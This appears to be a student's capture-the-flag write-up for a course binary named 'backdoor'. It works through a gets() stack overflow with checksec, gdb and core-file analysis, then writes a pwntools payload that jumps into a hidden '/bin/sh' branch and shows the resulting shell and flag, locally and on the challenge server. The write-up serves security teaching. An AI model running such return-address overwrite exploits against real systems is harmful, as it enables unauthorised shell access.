```
I put a check in my shell command so that only I can use it.
I know that'll stop people from hacking me now!
```
This is gonna be our canary on isn't it

Location: ``nc offsec-chalbroker.osiris.cyber.nyu.edu 1339``
Download: `backdoor`
Lore: Jumping
Flag: `flag{y0u_dont_n33d_t0_jump_t0_th3_b3ginning_of_functi0ns}`

###### First Run:
```
┌──(kali㉿kali)-[~/Desktop/5-Week]
└─$ ./backdoor    
I patched out all my old bugs, so I know my code is super-secure! Tell me your name, friend:
Nobody
You can't hack me, Nobody
```
###### Code:
```c
undefined8 main(EVP_PKEY_CTX *param_1)
{
  char data [32];
  
  init(param_1);
  puts(
      "I patched out all my old bugs, so I know my code is super-secure! Tell me your name, friend:"
      );
  gets(data);
  printf("You can\'t hack me, %s\n",data);
  return 0;
}
```
Look how similar this is to School...
##### Checksec:
```
┌──(kali㉿kali)-[~/Desktop/5-Week]
└─$ pwn checksec backdoor                      
[*] '/home/kali/Desktop/5-Week/backdoor'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```
##### VMMAP
Nothing super exciting tbh
```
Start              End                Offset             Perm Path
0x0000000000400000 0x0000000000401000 0x0000000000000000 r-x /home/kali/Desktop/5-Week/backdoor
0x0000000000600000 0x0000000000601000 0x0000000000000000 r-- /home/kali/Desktop/5-Week/backdoor
0x0000000000601000 0x0000000000602000 0x0000000000001000 rw- /home/kali/Desktop/5-Week/backdoor
0x00007ffff7dc8000 0x00007ffff7dcb000 0x0000000000000000 rw- 
0x00007ffff7dcb000 0x00007ffff7df1000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc.so.6
0x00007ffff7df1000 0x00007ffff7f46000 0x0000000000026000 r-x /usr/lib/x86_64-linux-gnu/libc.so.6
0x00007ffff7f46000 0x00007ffff7f9a000 0x000000000017b000 r-- /usr/lib/x86_64-linux-gnu/libc.so.6
0x00007ffff7f9a000 0x00007ffff7f9e000 0x00000000001cf000 r-- /usr/lib/x86_64-linux-gnu/libc.so.6
0x00007ffff7f9e000 0x00007ffff7fa0000 0x00000000001d3000 rw- /usr/lib/x86_64-linux-gnu/libc.so.6
0x00007ffff7fa0000 0x00007ffff7fad000 0x0000000000000000 rw- 
0x00007ffff7fc3000 0x00007ffff7fc5000 0x0000000000000000 rw- 
0x00007ffff7fc5000 0x00007ffff7fc9000 0x0000000000000000 r-- [vvar]
0x00007ffff7fc9000 0x00007ffff7fcb000 0x0000000000000000 r-x [vdso]
0x00007ffff7fcb000 0x00007ffff7fcc000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
0x00007ffff7fcc000 0x00007ffff7ff1000 0x0000000000001000 r-x /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
0x00007ffff7ff1000 0x00007ffff7ffb000 0x0000000000026000 r-- /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
0x00007ffff7ffb000 0x00007ffff7ffd000 0x0000000000030000 r-- /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
0x00007ffff7ffd000 0x00007ffff7fff000 0x0000000000032000 rw- /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
```

###### Where is our segfault:
```python
def ripOffset():
	p = process('./backdoor')
	d = p.recvuntil("friend:")
	p.sendline(cyclic(100))
	p.wait()
	cf = p.corefile
	stack = cf.rsp
	info("rsp = %#x", stack)
	pattern = cf.read(stack, 4)
	ripOffset = cyclic_find(pattern)
	info("rip offset = %d", ripOffset)
```
###### Results:
```
┌──(kali㉿kali)-[~/Desktop/5-Week]
└─$ python3 Backdoor_Pwn1.py                   
[+] Starting local process './backdoor': pid 1437485
/home/kali/Desktop/5-Week/Backdoor_Pwn1.py:27: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  d = p.recvuntil("friend:")
[*] Process './backdoor' stopped with exit code -11 (SIGSEGV) (pid 1437485)
[+] Parsing corefile...: Done
[*] '/home/kali/Desktop/5-Week/core.1437485'
    Arch:      amd64-64-little
    RIP:       0x40073c
    RSP:       0x7fff509ad318
    Exe:       '/home/kali/Desktop/5-Week/backdoor' (0x400000)
    Fault:     0x6161616c6161616b
[*] rsp = 0x7fff509ad318
[*] rip offset = 40
```

```
┌──(kali㉿kali)-[~/Desktop/5-Week]
└─$ pwn cyclic 100 > inp
┌──(kali㉿kali)-[~/Desktop/5-Week]
└─$ gdb ./backdoor -q
GEF for linux ready, type `gef' to start, `gef config' to configure
88 commands loaded and 5 functions added for GDB 13.2 in 0.00ms using Python engine 3.11
Reading symbols from ./backdoor...
(No debugging symbols found in ./backdoor)
gef➤  r < inp
I patched out all my old bugs, so I know my code is super-secure! Tell me your name, friend:
You can't hack me, aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
Program received signal SIGSEGV, Segmentation fault.

```
###### Registers
```
$rax   : 0x0               
$rbx   : 0x00007fffffffded8  →  0x00007fffffffe24a  →  "/home/kali/Desktop/5-Week/backdoor"
$rcx   : 0x0               
$rdx   : 0x0               
$rsp   : 0x00007fffffffddc8  →  "kaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawa[...]"
$rbp   : 0x6161616a61616169 ("iaaajaaa"?)
$rsi   : 0x00007fffffffdbf0  →  "You can't hack me, aaaabaaacaaadaaaeaaafaaagaaahaa[...]"
$rdi   : 0x00007fffffffdbc0  →  0x00007fffffffdbf0  →  "You can't hack me, aaaabaaacaaadaaaeaaafaaagaaahaa[...]"
$rip   : 0x000000000040073c  →  <main+68> ret 
$r8    : 0x73              
$r9    : 0x1               
$r10   : 0x0               
$r11   : 0x202             
$r12   : 0x0               
$r13   : 0x00007fffffffdee8  →  0x00007fffffffe26d  →  "COLORFGBG=15;0"
$r14   : 0x0               
$r15   : 0x00007ffff7ffd000  →  0x00007ffff7ffe2d0  →  0x0000000000000000
```
###### Stack:
```
0x00007fffffffddc8│+0x0000: "kaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawa[...]"    ← $rsp
0x00007fffffffddd0│+0x0008: "maaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaaya[...]"
0x00007fffffffddd8│+0x0010: "oaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa"
0x00007fffffffdde0│+0x0018: "qaaaraaasaaataaauaaavaaawaaaxaaayaaa"
0x00007fffffffdde8│+0x0020: "saaataaauaaavaaawaaaxaaayaaa"
0x00007fffffffddf0│+0x0028: "uaaavaaawaaaxaaayaaa"
0x00007fffffffddf8│+0x0030: "waaaxaaayaaa"
0x00007fffffffde00│+0x0038: 0x0000000061616179 ("yaaa"?)
```
###### Offsets:
```
┌──(kali㉿kali)-[~/Desktop/5-Week]
└─$ python3                 
Python 3.11.6 (main, Oct  8 2023, 05:06:43) [GCC 13.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> from pwn import *
>>> cyclic_find("kaaa")
40
>>> cyclic_find("iaaa")
32
>>> 
zsh: suspended  python3
```

So it will run any address we put in at that 40th byte

Now, Backdoor has an unused function called `get_time
![[Pasted image 20240305230642.png]]
We see it uses system, which it imported:
![[Pasted image 20240306113928.png]]

It makes a system call, but with a command that won't help us:
```c
/* WARNING: Removing unreachable block (ram,0x004006bb) */
void get_time(void)
{
  system("/bin/date");
  return;
}
```

HOWEVER, it's assembly tells us a different story, and that warning is a clue
```
        0040069d 55              PUSH       RBP
        0040069e 48 89 e5        MOV        RBP,RSP
        004006a1 53              PUSH       RBX
        004006a2 48 83 ec 18     SUB        RSP,0x18
        004006a6 bb c8 07        MOV        EBX,s_/bin/date_004007c8    = "/bin/date"
                 40 00
        004006ab c7 45 ec        MOV        dword ptr [RBP + local_1c],0xdead
                 ad de 00 00
        004006b2 81 7d ec        CMP        dword ptr [RBP + local_1c],0x1337
                 37 13 00 00
        004006b9 75 05           JNZ        LAB_004006c0
        004006bb bb d2 07        MOV        EBX,s_/bin/sh_004007d2        = "/bin/sh"
                 40 00
                             LAB_004006c0                        XREF[1]:     004006b9(j)  
        004006c0 48 89 df        MOV        RDI=>s_/bin/sh_004007d2,RBX    = "/bin/date"
                                                                          = "/bin/sh"
        004006c3 b8 00 00        MOV        EAX,0x0
                 00 00
        004006c8 e8 83 fe        CALL       <EXTERNAL>::system   int system(char * __command)
                 ff ff
        004006cd 48 83 c4 18     ADD        RSP,0x18
        004006d1 5b              POP        RBX
        004006d2 5d              POP        RBP
        004006d3 c3              RET
```
That line at `004006bb` is unreachable...but I bet we could jump there
We probably don't want RBP to be fucked up though...our whole stack is pretty fucked lol

Rbp during a normal run:
```
$rax   : 0x00007fffffffdda0  →  0x0000000074736554 ("Test"?)
$rbx   : 0x00007fffffffded8  →  0x00007fffffffe24a  →  "/home/kali/Desktop/5-Week/backdoor"
$rcx   : 0x00007ffff7f9eaa0  →  0x00000000fbad2288
$rdx   : 0x0               
$rsp   : 0x00007fffffffdda0  →  0x0000000074736554 ("Test"?)
$rbp   : 0x00007fffffffddc0  →  0x0000000000000001
```

Oh fuck me I got it without unfucking RBP!

###### Code:
```python
def pld():
	pad = b'A'*40
	addr = p64(0x00004006bb)
	#a = pad + addr
	#print(a)
	return pad + addr

def testPld():
	p =  process('/bin/bash')
	p.sendline('gdb ./backdoor -q')
	p.sendline("r")
	p.recvuntil("friend:")
	p.sendline(pld())
	p.interactive()
```
###### Results:
```
┌──(kali㉿kali)-[~/Desktop/5-Week]
└─$ python3 Backdoor_Pwn1.py
[*] Switching to interactive mode
You can't hack me, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xbb\x06@
[Detaching after vfork from child process 1466925]
$ whoami
kali
$ pwd
/home/kali/Desktop/5-Week
$  zsh: suspended (signal)  python3 Backdoor_Pwn1.py
```

### Remote:
###### Code:
```python
def remoteShell():
	p = remote(HOST, PORT)
	p.recvuntil("friend:")
	p.sendline(pld())
	p.interactive()
```
I don't know that I need to put this code in the writeups anymore...It's become very straightforward
Like, just remove the `testPld()` and `remoteShell()` function code from the writeup (but still leave in the appeendix)
###### Results:
```
┌──(kali㉿kali)-[~/Desktop/5-Week]
└─$ python3 Backdoor_Pwn1.py
[+] Opening connection to offsec-chalbroker.osiris.cyber.nyu.edu on port 1339: Done
[*] Switching to interactive mode
You can't hack me, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xbb\x06@
$ whoami
pwn
$ ls
backdoor
flag.txt
$ cat flag.txt
flag{y0u_dont_n33d_t0_jump_t0_th3_b3ginning_of_functi0ns}
```

So, what I really want to learn from here is what is the BARE MINIMUM shellcode I need for [[School]]
I think this is the important part, starting with where we jumped to
```
        004006bb bb d2 07        MOV        EBX,s_/bin/sh_004007d2       = "/bin/sh"
                 40 00
                             LAB_004006c0    XREF[1]:     004006b9(j)  
        004006c0 48 89 df        MOV        RDI=>s_/bin/sh_004007d2,RBX  = "/bin/date"
												                        = "/bin/sh"
        004006c3 b8 00 00        MOV        EAX,0x0
                 00 00
        004006c8 e8 83 fe        CALL       <EXTERNAL>::system   int system(char * __command)
                 ff ff
```

Hmm, is it a problem that system isn't included in the code though?

Here it is in gdb
```
   0x000000000040069d <+0>:     push   rbp
   0x000000000040069e <+1>:     mov    rbp,rsp
   0x00000000004006a1 <+4>:     push   rbx
   0x00000000004006a2 <+5>:     sub    rsp,0x18
   0x00000000004006a6 <+9>:     mov    ebx,0x4007c8
   0x00000000004006ab <+14>:    mov    DWORD PTR [rbp-0x14],0xdead
   0x00000000004006b2 <+21>:    cmp    DWORD PTR [rbp-0x14],0x1337
   0x00000000004006b9 <+28>:    jne    0x4006c0 <get_time+35>
   0x00000000004006bb <+30>:    mov    ebx,0x4007d2
   0x00000000004006c0 <+35>:    mov    rdi,rbx
   0x00000000004006c3 <+38>:    mov    eax,0x0
   0x00000000004006c8 <+43>:    call   0x400550 <system@plt>
   0x00000000004006cd <+48>:    add    rsp,0x18
   0x00000000004006d1 <+52>:    pop    rbx
   0x00000000004006d2 <+53>:    pop    rbp
   0x00000000004006d3 <+54>:    ret
```
